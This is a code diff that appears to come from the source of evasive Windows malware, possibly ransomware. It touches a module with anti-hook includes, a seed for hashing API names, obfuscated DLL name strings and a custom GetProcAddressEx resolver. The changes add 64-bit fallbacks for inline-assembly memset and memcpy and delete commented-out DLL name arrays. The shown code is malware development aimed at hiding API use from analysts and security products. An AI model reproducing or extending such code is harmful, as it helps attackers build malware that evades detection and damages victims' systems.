@@ -4,6 +4,10 @@
 #include "antihook/antihooks.h"
 #include "hash.h"
 
+#ifdef HASHING_SEED
+#undef HASHING_SEED
+#endif
+
 #define HASHING_SEED 23341
 #define API_CACHE_SIZE (sizeof(LPVOID) * 1024)
 
@@ -162,6 +166,9 @@ void* m_memset(void* szBuffer, DWORD dwSym, DWORD dwLen)
 		return NULL;
 	}
 
+#ifdef _WIN64
+	memset(szBuffer, dwSym, dwLen);
+#else
 	__asm
 	{
 		pushad
@@ -171,6 +178,7 @@ void* m_memset(void* szBuffer, DWORD dwSym, DWORD dwLen)
 		rep		stosb
 		popad
 	}
+#endif
 
 	return NULL;
 }
@@ -182,6 +190,9 @@ void* m_memcpy(void* szBuf, const void* szStr, int nLen)
 		return NULL;
 	}
 
+#ifdef _WIN64
+	memcpy(szBuf, szStr, nLen);
+#else
 	__asm
 	{
 		pushad
@@ -191,6 +202,7 @@ void* m_memcpy(void* szBuf, const void* szStr, int nLen)
 		rep		movsb
 		popad
 	}
+#endif
 
 	return NULL;
 }
@@ -524,14 +536,6 @@ api::GetProcAddressEx(
 	LPCSTR Shell32DLL = OBFA("Shell32.dll");
 	LPCSTR Ole32DLL = OBFA("Ole32.dll");
 	LPCSTR OleAut32DLL = OBFA("OleAut32.dll");
-	//CHAR Advapi32Dll[] = { 'A', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0 };
-	//CHAR Kernel32Dll[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
-	//CHAR Netapi32Dll[] = { 'N', 'e', 't', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0 };
-	//CHAR IphlpapiDll[] = { 'I', 'p', 'h', 'l', 'p', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };
-	//CHAR RstrtmgrDll[] = { 'R', 's', 't', 'r', 't', 'm', 'g', 'r', '.', 'd', 'l', 'l', 0 };
-	//CHAR Ws2_32Dll[] = { 'W', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
-	//CHAR User32Dll[] = { 'U', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
-	//CHAR ShlwapiDll[] = { 'S', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };
 
 	if (ModuleName)
 	{
